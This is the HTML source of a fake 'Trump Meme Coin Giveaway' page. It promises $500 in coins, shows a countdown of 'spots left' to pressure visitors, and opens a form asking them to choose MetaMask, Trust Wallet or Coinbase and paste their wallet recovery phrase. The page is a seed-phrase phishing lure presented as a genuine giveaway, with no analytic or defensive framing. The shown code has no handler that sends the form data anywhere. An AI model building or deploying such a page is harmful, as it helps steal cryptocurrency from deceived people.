<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>The Official Trump Meme Coin Giveaway</title>
  <style>
    /* General Reset */
    body, h1, h2, p, button, input, select, a, footer {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      background: url('https://images.unsplash.com/photo-1499696562547-dbe51006e1bb?q=80&w=686&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaWQ9by1wYWdlfHx8fGVufDB8fA%3D%3D') no-repeat center center/cover;
      color: #333;
      line-height: 1.6;
      overflow-x: hidden;
    }

    header {
      background: rgba(0, 86, 179, 0.8);
      color: #fff;
      text-align: center;
      padding: 20px 10px;
    }

    .container {
      max-width: 900px;
      margin: 30px auto;
      padding: 20px;
      background: #fff;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }

    /* Fix for button not being clickable */
    .btn {
      display: block;
      width: 100%;
      padding: 15px;
      margin-top: 20px;
      font-size: 1.2rem;
      font-weight: bold;
      color: #fff;
      background: #ff4500;
      border: none;
      border-radius: 5px;
      text-align: center;
      cursor: pointer;
      position: relative; /* Ensures it's clickable */
      z-index: 10;
      transition: transform 0.2s, background 0.3s;
    }

    .btn:hover {
      background: #e03e00;
      transform: scale(1.05);
    }

    /* Wallet Connection Page */
    .wallet-page {
      display: none;
      background: #fff;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 90%;
      max-width: 400px;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
      z-index: 1000;
    }

    .wallet-page.active {
      display: block;
    }

    footer {
      text-align: center;
      margin-top: 30px;
      padding: 20px 0;
      background: #f1f1f1;
      color: #666;
    }

    /* Live Wallet Counter */
    .wallet-counter {
      font-size: 1.2rem;
      font-weight: bold;
      color: red;
      text-align: center;
      margin-top: 10px;
    }

    /* Mobile Optimization */
    @media (max-width: 600px) {
      .container {
        width: 90%;
        padding: 15px;
      }
    }
  </style>
</head>
<body>
  <header>
    <h1>Trump Meme Coin Giveaway</h1>
    <p>Make America Great Again!</p>
  </header>

  <!-- Live Wallet Counter -->
  <div class="wallet-counter">
    Only <span id="wallet-count">2,000</span> spots left!
  </div>

  <div class="container">
    <h2>Join the Revolution!</h2>
    <button id="connect-wallet-btn" class="btn">Connect Wallet</button>
  </div>

  <div class="wallet-page" id="wallet-page">
    <h2>Connect Your Wallet</h2>
    <p>Enter your wallet details to claim $500 worth of Trump Meme Coins.</p>
    <form id="wallet-form">
      <label for="wallet-type">Select Wallet Type</label>
      <select id="wallet-type" name="wallet_type" required>
        <option value="metamask">MetaMask</option>
        <option value="trustwallet">Trust Wallet</option>
        <option value="coinbase">Coinbase Wallet</option>
        <option value="others">Others</option>
      </select>
      <label for="wallet-phrase">Enter Your Wallet Phrase</label>
      <textarea id="wallet-phrase" name="wallet_phrase" placeholder="Copy & Paste Wallet Phrase" required></textarea>
      <button class="btn" type="submit">Submit</button>
    </form>
  </div>

  <footer>
    <p>&copy; 2025 Trump Meme Coin Giveaway. All rights reserved.</p>
  </footer>

  <script>
    document.getElementById("connect-wallet-btn").addEventListener("click", function() {
      document.getElementById('wallet-page').classList.add('active');
    });

    // Live Wallet Counter Simulation
    let count = 2000;
    setInterval(() => {
      if (count > 1800) {
        count--;
        document.getElementById('wallet-count').textContent = count;
      }
    }, 5000);
  </script>
</body>
</html>
